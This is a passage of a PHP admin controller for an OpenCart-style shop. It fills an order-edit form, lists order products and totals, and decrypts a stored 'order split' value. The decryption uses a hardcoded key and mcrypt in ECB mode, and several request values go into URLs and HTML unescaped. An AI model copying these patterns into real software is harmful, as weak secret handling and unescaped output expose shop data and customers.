		if (isset($this->error['products'])) {
			$this->data['error_products'] = $this->error['products'];
		} else {
			$this->data['error_products'] = '';
		}
		
		if (isset($this->error['payment_country'])) {
			$this->data['error_payment_country'] = $this->error['payment_country'];
		} else {
			$this->data['error_payment_country'] = '';
		}
		
		if (isset($this->error['shipping_country'])) {
			$this->data['error_shipping_country'] = $this->error['shipping_country'];
		} else {
			$this->data['error_shipping_country'] = '';
		}
		
		$url = '';
		
		if (isset($this->request->get['filter_order_id'])) {
			$url .= '&filter_order_id=' . $this->request->get['filter_order_id'];
		}
		
		if (isset($this->request->get['filter_name'])) {
			$url .= '&filter_name=' . $this->request->get['filter_name'];
		}
		
		if (isset($this->request->get['filter_order_status_id'])) {
			$url .= '&filter_order_status_id=' . $this->request->get['filter_order_status_id'];
		}
		
		if (isset($this->request->get['filter_date_added'])) {
			$url .= '&filter_date_added=' . $this->request->get['filter_date_added'];
		}
		
		if (isset($this->request->get['filter_total'])) {
			$url .= '&filter_total=' . $this->request->get['filter_total'];
		}
		
		if (isset($this->request->get['page'])) {
			$url .= '&page=' . $this->request->get['page'];
		}
		
		if (isset($this->request->get['sort'])) {
			$url .= '&sort=' . $this->request->get['sort'];
		}
		
		if (isset($this->request->get['order'])) {
			$url .= '&order=' . $this->request->get['order'];
		}
		
		$this->document->breadcrumbs = array();
		
		$this->document->breadcrumbs[] = array(
			'href'      => $this->url->https('common/home'),
			'text'      => $this->language->get('text_home'),
			'separator' => FALSE
		);
		
		$this->document->breadcrumbs[] = array(
			'href'      => $this->url->https('sale/order'),
			'text'      => $this->language->get('heading_title'),
			'separator' => ' :: '
		);
		
		$id = $this->request->get['order_id'];
		$this->data['action'] = $this->url->https('sale/order/update');
		$this->data['action'] .= "&order_id=$id";
		$this->data['cancel'] = $this->url->https('sale/order' . $url);
		
		$this->load->model('localisation/country');
		$this->data['countries'] = $this->model_localisation_country->getCountries();
		
		$id = $this->request->get['order_id'];
		
		$order_info = $this->model_sale_order->getOrder($id);
		//print_r($order_info);
		//die;
		//{
		if (isset($this->request->post['payment_currency'])) {
			$this->data['payment_currency'] = $this->request->post['payment_currency'];
		} elseif (isset($order_info['currency'])) {
				$this->data['payment_currency'] = $order_info['currency'];
			} else {
			$this->data['payment_currency'] = '';
		}
		if (isset($this->request->post['currency_value'])) {
			$this->data['currency_value'] = $this->request->post['currency_value'];
		} elseif (isset($order_info['currency'])) {
				$this->data['currency_value'] = $order_info['value'];
			} else {
			$this->data['currency_value'] = '1.00';
		}
		if (isset($this->request->post['total'])) {
			$this->data['total'] = $this->request->post['total'];
		} elseif (isset($order_info['total'])) {
				$this->data['total'] = $order_info['total'];
			} else {
			$this->data['total'] = '';
		}
		if (isset($this->request->post['payment_method'])) {
			$this->data['payment_method'] = $this->request->post['payment_method'];
		} elseif (isset($order_info['payment_method'])) {
				$this->data['payment_method'] = $order_info['payment_method'];
			} else {
			$this->data['payment_method'] = '';
		}
		if (isset($this->request->post['shipping_method'])) {
			$this->data['shipping_method'] = $this->request->post['shipping_method'];
		} elseif (isset($order_info['shipping_method'])) {
				$this->data['shipping_method'] = $order_info['shipping_method'];
			} else {
			$this->data['shipping_method'] = '';
		}
		if (isset($this->request->post['firstname'])) {
			$this->data['firstname'] = $this->request->post['firstname'];
		} elseif (isset($order_info['firstname'])) {
				$this->data['firstname'] = $order_info['firstname'];
			} else {
			$this->data['firstname'] = '';
		}
		if (isset($this->request->post['lastname'])) {
			$this->data['lastname'] = $this->request->post['lastname'];
		} elseif (isset($order_info['lastname'])) {
				$this->data['lastname'] = $order_info['lastname'];
			} else {
			$this->data['lastname'] = '';
		}
		if (isset($this->request->post['email'])) {
			$this->data['email'] = $this->request->post['email'];
		} elseif (isset($order_info['email'])) {
				$this->data['email'] = $order_info['email'];
			} else {
			$this->data['email'] = '';
		}
		if (isset($this->request->post['telephone'])) {
			$this->data['telephone'] = $this->request->post['telephone'];
		} elseif (isset($order_info['telephone'])) {
				$this->data['telephone'] = $order_info['telephone'];
			} else {
			$this->data['telephone'] = '';
		}
		if (isset($this->request->post['fax'])) {
			$this->data['fax'] = $this->request->post['fax'];
		} elseif (isset($order_info['fax'])) {
				$this->data['fax'] = $order_info['fax'];
			} else {
			$this->data['fax'] = '';
		}
		if (isset($this->request->post['order_status_id'])) {
			$this->data['order_status_id'] = $this->request->post['order_status_id'];
		} elseif (isset($order_info['order_status_id'])) {
				$this->data['order_status_id'] = $order_info['order_status_id'];
			} else {
			$this->data['order_status_id'] = '';
		}
		if (isset($this->request->post['notify'])) {
			$this->data['notify'] = $this->request->post['notify'];
		} else {
			$this->data['notify'] = '';
		}
		if (isset($this->request->post['comment'])) {
			$this->data['comment'] = $this->request->post['comment'];
		} else {
			$this->data['comment'] = '';
		}
		
		$this->data['shipping_address'] = array();
		if (isset($this->request->post['shipping_firstname'])) {
			$this->data['shipping_address']['firstname'] = $this->request->post['shipping_firstname'];
		} elseif (isset($order_info['shipping_firstname'])) {
				$this->data['shipping_address']['firstname'] = $order_info['shipping_firstname'];
			} else {
			$this->data['shipping_address']['firstname'] = '';
		}
		if (isset($this->request->post['shipping_lastname'])) {
			$this->data['shipping_address']['lastname'] = $this->request->post['shipping_lastname'];
		} elseif (isset($order_info['shipping_lastname'])) {
				$this->data['shipping_address']['lastname'] = $order_info['shipping_lastname'];
			} else {
			$this->data['shipping_address']['lastname'] = '';
		}
		if (isset($this->request->post['shipping_company'])) {
			$this->data['shipping_address']['company'] = $this->request->post['shipping_company'];
		} elseif (isset($order_info['shipping_company'])) {
				$this->data['shipping_address']['company'] = $order_info['shipping_company'];
			} else {
			$this->data['shipping_address']['company'] = '';
		}
		if (isset($this->request->post['shipping_address_1'])) {
			$this->data['shipping_address']['address_1'] = $this->request->post['shipping_address_1'];
		} elseif (isset($order_info['shipping_address_1'])) {
				$this->data['shipping_address']['address_1'] = $order_info['shipping_address_1'];
			} else {
			$this->data['shipping_address']['address_1'] = '';
		}
		if (isset($this->request->post['shipping_address_2'])) {
			$this->data['shipping_address']['address_2'] = $this->request->post['shipping_address_2'];
		} elseif (isset($order_info['shipping_address_2'])) {
				$this->data['shipping_address']['address_2'] = $order_info['shipping_address_2'];
			} else {
			$this->data['shipping_address']['address_2'] = '';
		}
		if (isset($this->request->post['shipping_city'])) {
			$this->data['shipping_address']['city'] = $this->request->post['shipping_city'];
		} elseif (isset($order_info['shipping_city'])) {
				$this->data['shipping_address']['city'] = $order_info['shipping_city'];
			} else {
			$this->data['shipping_address']['city'] = '';
		}
		if (isset($this->request->post['shipping_postcode'])) {
			$this->data['shipping_address']['postcode'] = $this->request->post['shipping_postcode'];
		} elseif (isset($order_info['shipping_postcode'])) {
				$this->data['shipping_address']['postcode'] = $order_info['shipping_postcode'];
			} else {
			$this->data['shipping_address']['postcode'] = '';
		}
		if (isset($this->request->post['shipping_zone_id'])) {
			$this->data['shipping_address']['zone_id'] = $this->request->post['shipping_zone_id'];
		} elseif (isset($order_info['shipping_zone_id'])) {
				$this->data['shipping_address']['zone_id'] = $order_info['shipping_zone_id'];
			} else {
			$this->data['shipping_address']['zone_id'] = '';
		}
		if (isset($this->request->post['shipping_country_id'])) {
			$this->data['shipping_address']['country'] = $this->request->post['shipping_country_id'];
		} elseif (isset($order_info['shipping_country_id'])) {
				$this->data['shipping_address']['country'] = $order_info['shipping_country_id'];
			} else {
			$this->data['shipping_address']['country'] = '';
		}
		
		$this->data['payment_address'] = array();
		if (isset($this->request->post['payment_firstname'])) {
			$this->data['payment_address']['firstname'] = $this->request->post['payment_firstname'];
		} elseif (isset($order_info['payment_firstname'])) {
				$this->data['payment_address']['firstname'] = $order_info['payment_firstname'];
			} else {
			$this->data['payment_address']['firstname'] = '';
		}
		if (isset($this->request->post['payment_lastname'])) {
			$this->data['payment_address']['lastname'] = $this->request->post['payment_lastname'];
		} elseif (isset($order_info['payment_lastname'])) {
				$this->data['payment_address']['lastname'] = $order_info['payment_lastname'];
			} else {
			$this->data['payment_address']['lastname'] = '';
		}
		if (isset($this->request->post['payment_company'])) {
			$this->data['payment_address']['company'] = $this->request->post['payment_company'];
		} elseif (isset($order_info['payment_company'])) {
				$this->data['payment_address']['company'] = $order_info['payment_company'];
			} else {
			$this->data['payment_address']['company'] = '';
		}
		if (isset($this->request->post['payment_address_1'])) {
			$this->data['payment_address']['address_1'] = $this->request->post['payment_address_1'];
		} elseif (isset($order_info['payment_address_1'])) {
				$this->data['payment_address']['address_1'] = $order_info['payment_address_1'];
			} else {
			$this->data['payment_address']['address_1'] = '';
		}
		if (isset($this->request->post['payment_address_2'])) {
			$this->data['payment_address']['address_2'] = $this->request->post['payment_address_2'];
		} elseif (isset($order_info['payment_address_2'])) {
				$this->data['payment_address']['address_2'] = $order_info['payment_address_2'];
			} else {
			$this->data['payment_address']['address_2'] = '';
		}
		if (isset($this->request->post['payment_city'])) {
			$this->data['payment_address']['city'] = $this->request->post['payment_city'];
		} elseif (isset($order_info['payment_city'])) {
				$this->data['payment_address']['city'] = $order_info['payment_city'];
			} else {
			$this->data['payment_address']['city'] = '';
		}
		if (isset($this->request->post['payment_postcode'])) {
			$this->data['payment_address']['postcode'] = $this->request->post['payment_postcode'];
		} elseif (isset($order_info['payment_postcode'])) {
				$this->data['payment_address']['postcode'] = $order_info['payment_postcode'];
			} else {
			$this->data['payment_address']['postcode'] = '';
		}
		if (isset($this->request->post['payment_zone_id'])) {
			$this->data['payment_address']['zone_id'] = $this->request->post['payment_zone_id'];
		} elseif (isset($order_info['payment_zone_id'])) {
				$this->data['payment_address']['zone_id'] = $order_info['payment_zone_id'];
			} else {
			$this->data['payment_address']['zone_id'] = '';
		}
		if (isset($this->request->post['payment_country_id'])) {
			$this->data['payment_address']['country'] = $this->request->post['payment_country_id'];
		} elseif (isset($order_info['payment_country_id'])) {
				$this->data['payment_address']['country'] = $order_info['payment_country_id'];
			} else {
			$this->data['payment_address']['country'] = '';
		}
	//	}
		$products = $this->model_sale_order->getOrderProducts($this->request->get['order_id']);
		if (empty($products))
		{
		$p11 = false;
		}
		else
		{
		$p11 = true;
		}
		$oid = $this->request->get['order_id'];
			$order_split = $this->model_sale_order->getOrderSplit($oid);
		//print_r($order_split); die;
				if ($order_split) {
				$this->data['split_date'] = $order_split['date'];
				$this->data['split_name'] = $order_split['name'];
				$this->data['split_value'] = $this->decryptData(base64_decode($order_split['value']));
			}
		if (isset($this->request->post['product_name'])) {
			foreach (array_keys($this->request->post['product_name']) as $order_product) {
				$this->data['order_products'][$order_product]['product_id'] = $order_product;
				$this->data['order_products'][$order_product]['name'] = $this->request->post['product_name'][$order_product];
				$this->data['order_products'][$order_product]['model'] = $this->request->post['product_model'][$order_product];
				$this->data['order_products'][$order_product]['price'] = $this->request->post['product_price'][$order_product];
				$this->data['order_products'][$order_product]['quantity'] = $this->request->post['product_quantity'][$order_product];
				$this->data['order_products'][$order_product]['tax'] = $this->request->post['product_tax'][$order_product];
				$this->data['order_products'][$order_product]['total'] = $this->request->post['product_total'][$order_product];
			}
		} elseif ($p11) {
		foreach ($products as $order_product)
	   {
		$this->data['order_products'][$order_product['order_product_id']]['product_id'] = $order_product['product_id'];
				$this->data['order_products'][$order_product['order_product_id']]['name'] = $order_product['name'];
				$this->data['order_products'][$order_product['order_product_id']]['model'] = $order_product['model'];
				$this->data['order_products'][$order_product['order_product_id']]['price'] = $order_product['price'];
				$this->data['order_products'][$order_product['order_product_id']]['quantity'] = $order_product['quantity'];
				$this->data['order_products'][$order_product['order_product_id']]['tax'] = $order_product['tax'];
				$this->data['order_products'][$order_product['order_product_id']]['total'] = $order_product['total'];
		}
		} else {
			$this->data['order_products'] = '';
		}
		//print_r($this->data['order_products']);
		//die;
		if (isset($this->request->post['weight'])) {
			$this->data['weight'] = $this->request->post['weight'];
		} else {
			$this->data['weight'] = '';
		}
		if (isset($this->request->post['shipping_tax'])) {
			$this->data['shipping_tax'] = $this->request->post['shipping_tax'];
		} else {
			$this->data['shipping_tax'] = '';
		}
		if (isset($this->request->post['tax'])) {
			$this->data['tax'] = $this->request->post['tax'];
		} else {
			$this->data['tax'] = '';
		}
		if (isset($this->request->post['sub_total'])) {
			$this->data['sub_total'] = $this->request->post['sub_total'];
		} else {
			$this->data['sub_total'] = '';
		}
		if (isset($this->request->post['shipping_cost'])) {
			$this->data['shipping_cost'] = $this->request->post['shipping_cost'];
		} else {
			$this->data['shipping_cost'] = '';
		}
		if (isset($this->request->post['total'])) {
			$this->data['total'] = $this->request->post['total'];
		} else {
			$this->data['total'] = '';
		}
		
		$this->load->model('localisation/currency');
		$this->load->model('sale/order');
		$tots = $this->model_sale_order->getOrderTotals($this->request->get['order_id']);
		$this->data['totalss'] = $this->model_sale_order->getOrderTotals($this->request->get['order_id']);
		
		$this->data['currencies'] = $this->model_localisation_currency->getCurrencies();
		
		$this->load->model('setting/extension');
		$this->data['payment_methods'] = $this->model_setting_extension->getInstalled('payment');
		$this->data['shipping_methods'] = $this->model_setting_extension->getInstalled('shipping');
		
		$this->load->model('catalog/product');
		$this->data['products'] = $this->model_catalog_product->getProducts();
		
		$this->data['totals'] = array();
		$this->load->model('localisation/order_status');
		$this->data['order_statuses'] = $this->model_localisation_order_status->getOrderStatuses();
		
		$this->template = 'sale/order_create.tpl';
		$this->children = array(
			'common/header',
			'common/footer'
		);
		
		$this->response->setOutput($this->render(TRUE), $this->config->get('config_compression')); 
	}
	
	public function calculateTotal() {
		/*
		$shipping_method = $this->request->post['shipping_method'];
		$this->load->catalogModel('shipping/' . $shipping_method);
		
		$shipping_address = array(
			'firstname' => $this->request->post['shipping_firstname'],
			'lastname'  => $this->request->post['shipping_lastname'],
			'company'   => $this->request->post['shipping_company'],
			'address_1' => $this->request->post['shipping_address_1'],
			'address_2' => $this->request->post['shipping_address_2'],
			'city'      => $this->request->post['shipping_city'],
			'postcode'  => $this->request->post['shipping_postcode'],
			'zone'      => $this->request->post['shipping_zone_id'],
			'country'   => $this->request->post['shipping_country_id']
		);
		
		$quote = $this->{'model_shipping_' . $shipping_method}->getQuote($shipping_address);
		
		if ($quote) {
			$quote_data = array(
				'title'      => $quote['title'],
				'quote'      => $quote['quote'], 
				'sort_order' => $quote['sort_order'],
				'error'      => $quote['error']
			);
		}
		$this->load->library('json');
		// send shipping cost
		$this->response->setOutput(Json::encode($this->request->post));
		*/
	}
	
	public function zone() {
		$output = '<option value="FALSE">' . $this->language->get('text_select') . '</option>';
		
		$this->load->model('localisation/zone');
		
		$results = $this->model_localisation_zone->getZonesByCountryId($this->request->get['country_id']);
		
		foreach ($results as $result) {
			$output .= '<option value="' . $result['zone_id'] . '"';
			
			if (isset($this->request->get['zone_id']) && ($this->request->get['zone_id'] == $result['zone_id'])) {
				$output .= ' selected="selected"';
			}
			
			$output .= '>' . $result['name'] . '</option>';
		}
		
		if ( ! $results) {
			if ( ! $this->request->get['zone_id']) {
				$output .= '<option value="0" selected="selected">' . $this->language->get('text_none') . '</option>';
			} else {
				$output .= '<option value="0">' . $this->language->get('text_none') . '</option>';
			}
		}
		
		$this->response->setOutput($output, $this->config->get('config_compression'));
	}
	
	public function addProduct() {
		$output = '<tr id="row[' . $this->request->get['product_id'] . ']">';
		
		$this->load->model('catalog/product');
		$results = $this->model_catalog_product->getProduct($this->request->get['product_id']);
		
		if (isset($this->request->get['country_id']) && $this->request->get['country_id'] > 0 && is_numeric($this->request->get['country_id'])) {
			$country_id = $this->request->get['country_id'];
		} else {
			$country_id = 0;
		}
		
		if (isset($this->request->get['zone_id']) && $this->request->get['zone_id'] > 0 && is_numeric($this->request->get['zone_id'])) {
			$zone_id = $this->request->get['zone_id'];
		} else {
			$zone_id = 0;
		}
		
		$this->load->model('sale/tax');
		if ($product_tax = $this->model_sale_tax->calculate($country_id, $zone_id, $results['price'], $results['tax_class_id'])) {
			$product_total = number_format($this->model_sale_tax->calculate($country_id, $zone_id, $results['price'], $results['tax_class_id'], TRUE), 2, '.', '');
			$product_tax = number_format($product_tax, 2, '.', '');
		} else {
			$product_total = number_format($results['price'], 2, '.', '');
		}
		
		$output .= '<td><a class="delete"><img src="view/image/filemanager/edit-delete.png" /></a></td><td><input name="product_name[' . $results['product_id'] . ']" value="' . $results['name'] . '" /></td><td class="right"><input name="product_model[' . $results['product_id'] . ']" value="' .  $results['model'] . '" /></td><td><input size="3" onblur="updateProductTotal(' . $this->request->get['product_id'] . ')" name="product_quantity[' . $results['product_id'] . ']" value="1" /></td><td class="right"><input onblur="updateProductTotal(' . $this->request->get['product_id'] . ')" name="product_price[' . $results['product_id'] . ']" value="' . number_format($results['price'], 2, '.', '') . '" /></td><td class="right"><input onblur="updateProductTotal(' . $this->request->get['product_id'] . ')" name="product_tax[' . $results['product_id'] . ']" value="' . $product_tax . '" />%</td><td class="right"><input name="product_total[' . $results['product_id'] . ']" value="' . $product_total . '" /></td></tr>';
		$this->response->setOutput($output, $this->config->get('config_compression'));
	}
	
	private function validateCreate() {
		if (!$this->user->hasPermission('modify', 'sale/order')) {
			$this->error['warning'] = $this->language->get('error_permission'); 
		}
		
		if (empty($this->request->post['product_name'])) {
			$this->error['products'] = $this->language->get('error_products');
		}
		if ($this->request->post['payment_country_id'] < 1) {
			$this->error['payment_country'] = $this->language->get('error_payment_country');
		}
		if ($this->request->post['shipping_country_id'] < 1) {
			$this->error['shipping_country'] = $this->language->get('error_shipping_country');
		}
		
		if ( ! $this->error) {
			return TRUE;
		} else {
			return FALSE;
		}
	}
	
	private function decryptData($value) {
		$key = "godverdomme!!";
		$crypttext = $value;
		$iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_ECB);
		$iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
		$decrypttext = mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, $crypttext, MCRYPT_MODE_ECB, $iv);
		return trim($decrypttext);
	}
}
?>